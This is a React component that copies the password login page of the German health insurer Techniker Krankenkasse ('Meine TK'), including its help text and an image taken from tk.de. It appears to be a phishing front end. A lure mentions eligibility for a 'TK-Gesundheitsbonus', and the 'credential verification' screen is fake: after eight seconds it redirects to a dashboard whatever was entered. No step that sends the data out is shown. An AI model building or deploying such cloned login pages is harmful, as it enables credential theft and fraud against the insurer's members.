
import React, { useState } from 'react';
import { ChevronRight } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from './ui/dialog';

// Simple loading screen component for login transition
const SimpleLoadingScreen = () => {
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  
  const messages = [
    "Checking your account status...",
    "Verifying your credentials...",
    "Checking your eligibility for the TK-Gesundheitsbonus...",
    "Loading your account dashboard...",
    "Finalizing your session..."
  ];

  React.useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessageIndex((prev) => (prev + 1) % messages.length);
    }, 2000);

    return () => clearInterval(interval);
  }, [messages.length]);

  return (
    <div className="fixed inset-0 z-[9999] min-h-screen flex items-center justify-center bg-[#eceae8]">
      <div className="text-center">
        <div className="flex justify-center space-x-2 mb-8">
          {[0, 200, 400].map((delay, index) => (
            <div 
              key={index}
              className="w-4 h-4 rounded-sm bg-[#009ee0] animate-bounce"
              style={{ 
                animationDelay: `${delay}ms`,
                animationDuration: '1.4s'
              }}
            />
          ))}
        </div>
        
        <div className="h-12 flex items-center justify-center">
          <p 
            key={currentMessageIndex}
            className="text-lg text-gray-700 font-medium animate-fade-in"
          >
            {messages[currentMessageIndex]}
          </p>
        </div>
      </div>
    </div>
  );
};

const LoginSection = () => {
  const [versichertennummer, setVersichertennummer] = useState('');
  const [passwort, setPasswort] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Show the loading screen after a brief moment
    setTimeout(() => {
      setShowLoadingScreen(true);
    }, 500);
    
    // Simulate login process with loading screen
    await new Promise(resolve => setTimeout(resolve, 8000)); // 8 seconds total
    
    // After loading completes, redirect to dashboard
    setIsLoading(false);
    setShowLoadingScreen(false);
    navigate('/dashboard', { replace: true });
  };

  // Show loading screen if login is in progress
  if (showLoadingScreen) {
    return <SimpleLoadingScreen />;
  }

  return (
    <section className="lg:py-12 lg:md:py-20" style={{ backgroundColor: '#eceae8' }}>
      <div className="container mx-auto px-4">
        {/* Desktop Layout */}
        <div className="hidden lg:block">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12 max-w-6xl mx-auto">
            {/* Login Form */}
            <div className="bg-white p-8 md:p-10 shadow-sm">
              <h2 className="text-2xl md:text-2xl font-normal mb-8 md:mb-8 text-gray-800">Login mit Passwort</h2>
              
              <form onSubmit={handleSubmit} className="space-y-6 md:space-y-6">
                <div>
                  <label htmlFor="versichertennummer" className="block text-base md:text-base text-gray-700 mb-3 font-normal">
                    Versichertennummer
                  </label>
                  <input
                    type="text"
                    id="versichertennummer"
                    value={versichertennummer}
                    onChange={(e) => setVersichertennummer(e.target.value)}
                    className="w-full px-4 md:px-4 py-4 md:py-3 border border-gray-300 focus:outline-none focus:border-gray-500 bg-white text-base md:text-base"
                    required
                  />
                </div>
                
                <div>
                  <label htmlFor="passwort" className="block text-base md:text-base text-gray-700 mb-3 font-normal">
                    Passwort
                  </label>
                  <input
                    type="password"
                    id="passwort"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    className="w-full px-4 md:px-4 py-4 md:py-3 border border-gray-300 focus:outline-none focus:border-gray-500 bg-white text-base md:text-base"
                    required
                  />
                </div>
                
                <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
                  <DialogTrigger asChild>
                    <button type="button" className="text-gray-600 hover:text-gray-800 text-base md:text-base inline-block underline">
                      Wo finde ich meine Zugangsdaten?
                    </button>
                  </DialogTrigger>
                  <DialogContent className="max-w-4xl w-full max-h-[90vh] overflow-y-auto bg-white border-0 shadow-2xl p-0">
                    <div className="relative bg-white">
                      <button
                        onClick={() => setIsDialogOpen(false)}
                        className="absolute right-6 top-6 z-10 text-gray-400 hover:text-gray-600 text-2xl font-light"
                      >
                        ×
                      </button>
                      
                      <div className="p-8 space-y-6">
                        <h2 className="text-2xl font-normal text-gray-800 mb-8">
                          Wo finde ich meine Zugangsdaten?
                        </h2>
                        
                        <div className="space-y-4 text-gray-700">
                          <p className="leading-relaxed">
                            <span className="font-medium">1.</span> Die 10-stellige Versichertennummer finden Sie auf Ihrer Gesundheitskarte, sie beginnt mit einem Buchstaben.
                          </p>
                          
                          <p className="leading-relaxed">
                            <span className="font-medium">2.</span> Tragen Sie im Feld Passwort nur Ihr <span className="font-semibold">selbst vergebenes Passwort</span> ein. Ihren Freischaltcode oder Ihr Einmal-Kennwort können Sie über die Links unter "Weitere Möglichkeiten" eingeben.
                          </p>
                        </div>
                        
                        <div className="flex justify-center my-8">
                          <img 
                            src="https://www.tk.de/resource/blob/2065884/a6f35b860944d1c4c8b59d9fcb3fe0bd/versichertenkarte-data.png" 
                            alt="Gesundheitskarte mit markierter Versichertennummer" 
                            className="max-w-sm h-auto"
                          />
                        </div>
                        
                        <div className="space-y-6">
                          <h3 className="text-xl font-normal text-gray-800">
                            Mein Login funktioniert nicht. Woran könnte es liegen?
                          </h3>
                          
                          <div className="space-y-4 text-gray-700 leading-relaxed">
                            <p>
                              <span className="font-medium">1.</span> Verwenden Sie Ihren <span className="underline">Freischaltcode</span> oder Ihr <span className="underline">Einmal-Kennwort</span>, bitte <span className="font-semibold">nicht als Passwort</span>.
                            </p>
                            
                            <p>
                              <span className="font-medium">2.</span> Nutzen Sie einen <span className="font-semibold">Passwort-Manager</span>? Schalten Sie diesen aus und <span className="font-semibold">geben Sie Ihre Login-Daten manuell</span> ein.
                            </p>
                            
                            <p>
                              <span className="font-medium">3.</span> <span className="font-semibold">Löschen Sie den Browser-Cache</span> (temporär gespeicherte Daten). Drücken Sie dazu die Tasten-Kombination Strg + Shift + Entf und bestätigen Sie die Löschung. <span className="font-semibold">Alternativ</span> können Sie auch <span className="font-semibold">einen anderen Browser ausprobieren</span>.
                            </p>
                            
                            <p>
                              <span className="font-medium">4.</span> Die Versichertennummer beginnt immer mit einem Buchstaben. Gern verwechselt: Buchstabe O und Zahl 0 oder Buchstabe I und Zahl 1.
                            </p>
                          </div>
                          
                          <p className="text-gray-700 leading-relaxed">
                            Nicht fündig geworden? <span className="underline text-blue-600 cursor-pointer">In unseren FAQs erhalten Sie weitere Hilfe</span>.
                          </p>
                        </div>
                      </div>
                    </div>
                  </DialogContent>
                </Dialog>
                
                <button 
                  type="submit"
                  disabled={isLoading}
                  className="w-full text-white py-4 md:py-4 px-6 md:px-6 transition-colors flex items-center justify-between group font-normal text-base md:text-base disabled:opacity-70"
                  style={{ backgroundColor: '#454542' }}
                  onMouseEnter={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#3a3937')}
                  onMouseLeave={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#454542')}
                >
                  {isLoading ? (
                    <>
                      <span>Sie werden angemeldet.</span>
                      <div className="flex space-x-1">
                        <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                        <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                        <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                      </div>
                    </>
                  ) : (
                    <>
                      <span className="group-hover:underline transition-all duration-200">Einloggen</span>
                      <ChevronRight className="transition-transform group-hover:translate-x-1" size={20} />
                    </>
                  )}
                </button>
                
                {/* Desktop: Additional options below login button */}
                <div className="space-y-4 pt-4">
                  <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900">
                    <ChevronRight size={16} className="mr-3 text-gray-500" />
                    <span className="text-base">Passwort vergessen?</span>
                  </div>
                  <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900">
                    <ChevronRight size={16} className="mr-3 text-gray-500" />
                    <span className="text-base">
                      Neu bei Meine TK? <span className="text-blue-600">Jetzt registrieren</span>
                    </span>
                  </div>
                </div>
              </form>
            </div>
            
            {/* Desktop: Weitere Möglichkeiten */}
            <div className="bg-white px-4 py-3 shadow-sm" style={{ maxWidth: '300px', height: 'fit-content' }}>
              <h2 className="text-sm font-normal mb-2 text-gray-800">Weitere Möglichkeiten</h2>
              
              <div className="space-y-0">
                <div className="py-1 text-xs">
                  <span className="text-gray-700 flex items-center cursor-pointer hover:text-gray-900">
                    <ChevronRight size={12} className="mr-2 text-gray-500" />
                    Freischaltcode per Post erhalten?
                  </span>
                </div>
                
                <div className="py-1 text-xs">
                  <span className="text-gray-700 flex items-center cursor-pointer hover:text-gray-900">
                    <ChevronRight size={12} className="mr-2 text-gray-500" />
                    Einmal-Kennwort per Post erhalten?
                  </span>
                </div>
                
                <div className="py-1 text-xs">
                  <span className="text-gray-700 flex items-center cursor-pointer hover:text-gray-900">
                    <ChevronRight size={12} className="mr-2 text-gray-500" />
                    Mitgliedschaftsantrag: Status einsehen
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Mobile Layout - Combined Single Box */}
        <div className="lg:hidden">
          <div className="bg-white p-6 shadow-sm">
            <h2 className="text-2xl font-normal mb-8 text-gray-800">Login mit Passwort</h2>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="versichertennummer-mobile" className="block text-lg text-gray-800 mb-4 font-medium">
                  Versichertennummer
                </label>
                <input
                  type="text"
                  id="versichertennummer-mobile"
                  value={versichertennummer}
                  onChange={(e) => setVersichertennummer(e.target.value)}
                  className="w-full px-4 py-4 border border-gray-300 focus:outline-none focus:border-gray-500 bg-white text-lg"
                  required
                />
              </div>
              
              <div>
                <label htmlFor="passwort-mobile" className="block text-lg text-gray-800 mb-4 font-medium">
                  Passwort
                </label>
                <input
                  type="password"
                  id="passwort-mobile"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="w-full px-4 py-4 border border-gray-300 focus:outline-none focus:border-gray-500 bg-white text-lg"
                  required
                />
              </div>
              
              <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
                <DialogTrigger asChild>
                  <button type="button" className="text-gray-600 hover:text-gray-800 text-lg inline-block underline">
                    Wo finde ich meine Zugangsdaten?
                  </button>
                </DialogTrigger>
                <DialogContent className="max-w-[95vw] w-full max-h-[90vh] overflow-y-auto mx-4 bg-white border-0 shadow-2xl p-0">
                  <div className="relative bg-white">
                    <button
                      onClick={() => setIsDialogOpen(false)}
                      className="absolute right-4 top-4 z-10 text-gray-400 hover:text-gray-600 text-xl font-light"
                    >
                      ×
                    </button>
                    
                    <div className="p-6 space-y-4">
                      <h2 className="text-lg font-normal text-gray-800 mb-6">
                        Wo finde ich meine Zugangsdaten?
                      </h2>
                      
                      <div className="space-y-3 text-gray-700 text-sm">
                        <p className="leading-relaxed">
                          <span className="font-medium">1.</span> Die 10-stellige Versichertennummer finden Sie auf Ihrer Gesundheitskarte, sie beginnt mit einem Buchstaben.
                        </p>
                        
                        <p className="leading-relaxed">
                          <span className="font-medium">2.</span> Tragen Sie im Feld Passwort nur Ihr <span className="font-semibold">selbst vergebenes Passwort</span> ein. Ihren Freischaltcode oder Ihr Einmal-Kennwort können Sie über die Links unter "Weitere Möglichkeiten" eingeben.
                        </p>
                      </div>
                      
                      <div className="flex justify-center my-6">
                        <img 
                          src="https://www.tk.de/resource/blob/2065884/a6f35b860944d1c4c8b59d9fcb3fe0bd/versichertenkarte-data.png" 
                          alt="Gesundheitskarte mit markierter Versichertennummer" 
                          className="max-w-full h-auto"
                        />
                      </div>
                      
                      <div className="space-y-4">
                        <h3 className="text-base font-normal text-gray-800">
                          Mein Login funktioniert nicht. Woran könnte es liegen?
                        </h3>
                        
                        <div className="space-y-3 text-gray-700 text-sm leading-relaxed">
                          <p>
                            <span className="font-medium">1.</span> Verwenden Sie Ihren <span className="underline">Freischaltcode</span> oder Ihr <span className="underline">Einmal-Kennwort</span>, bitte <span className="font-semibold">nicht als Passwort</span>.
                          </p>
                          
                          <p>
                            <span className="font-medium">2.</span> Nutzen Sie einen <span className="font-semibold">Passwort-Manager</span>? Schalten Sie diesen aus und <span className="font-semibold">geben Sie Ihre Login-Daten manuell</span> ein.
                          </p>
                          
                          <p>
                            <span className="font-medium">3.</span> <span className="font-semibold">Löschen Sie den Browser-Cache</span> (temporär gespeicherte Daten). Drücken Sie dazu die Tasten-Kombination Strg + Shift + Entf und bestätigen Sie die Löschung. <span className="font-semibold">Alternativ</span> können Sie auch <span className="font-semibold">einen anderen Browser ausprobieren</span>.
                          </p>
                          
                          <p>
                            <span className="font-medium">4.</span> Die Versichertennummer beginnt immer mit einem Buchstaben. Gern verwechselt: Buchstabe O und Zahl 0 oder Buchstabe I und Zahl 1.
                          </p>
                        </div>
                        
                        <p className="text-gray-700 text-sm leading-relaxed">
                          Nicht fündig geworden? <span className="underline text-blue-600 cursor-pointer">In unseren FAQs erhalten Sie weitere Hilfe</span>.
                        </p>
                      </div>
                    </div>
                  </div>
                </DialogContent>
              </Dialog>
              
              <button 
                type="submit"
                disabled={isLoading}
                className="w-full text-white py-4 px-6 transition-colors flex items-center justify-between group font-normal text-lg disabled:opacity-70"
                style={{ backgroundColor: '#454542' }}
                onMouseEnter={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#3a3937')}
                onMouseLeave={(e) => !isLoading && (e.currentTarget.style.backgroundColor = '#454542')}
              >
                {isLoading ? (
                  <>
                    <span>Sie werden angemeldet.</span>
                    <div className="flex space-x-1">
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                      <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                    </div>
                  </>
                ) : (
                  <>
                    <span className="group-hover:underline transition-all duration-200">Einloggen</span>
                    <ChevronRight className="transition-transform group-hover:translate-x-1" size={24} />
                  </>
                )}
              </button>
              
              {/* Mobile: Additional options */}
              <div className="space-y-4 pt-4">
                <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900 py-3">
                  <ChevronRight size={20} className="mr-3 text-gray-500" />
                  <span className="text-lg">Passwort vergessen?</span>
                </div>
                <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900 py-3">
                  <ChevronRight size={20} className="mr-3 text-gray-500" />
                  <span className="text-lg">
                    Neu bei Meine TK? <span className="text-blue-600">Jetzt registrieren</span>
                  </span>
                </div>
              </div>
              
              <div className="pt-8 border-t border-gray-200">
                <h2 className="text-2xl font-normal mb-8 text-gray-800">Weitere Möglichkeiten</h2>
                
                <div className="space-y-4">
                  <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900 py-3">
                    <ChevronRight size={20} className="mr-3 text-gray-500" />
                    <span className="text-lg">Freischaltcode per Post erhalten?</span>
                  </div>
                  
                  <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900 py-3">
                    <ChevronRight size={20} className="mr-3 text-gray-500" />
                    <span className="text-lg">Einmal-Kennwort per Post erhalten?</span>
                  </div>
                  
                  <div className="flex items-center text-gray-700 cursor-pointer hover:text-gray-900 py-3">
                    <ChevronRight size={20} className="mr-3 text-gray-500" />
                    <span className="text-lg">Mitgliedschaftsantrag: Status einsehen</span>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
  );
};

export default LoginSection;
